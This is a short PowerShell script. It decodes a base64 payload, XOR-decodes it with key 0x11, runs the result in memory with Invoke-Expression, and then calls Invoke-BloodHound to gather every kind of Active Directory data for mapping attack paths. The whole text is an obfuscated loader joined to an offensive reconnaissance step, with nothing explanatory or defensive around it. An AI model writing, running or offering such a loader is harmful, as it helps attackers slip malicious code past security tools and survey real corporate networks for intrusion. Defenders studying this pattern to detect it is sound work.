$enc = [system.Text.Encoding]::UTF8


$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x11}
iex ([System.Text.Encoding]::ASCII.GetString($data))
Invoke-BloodHound -CollectionMethod All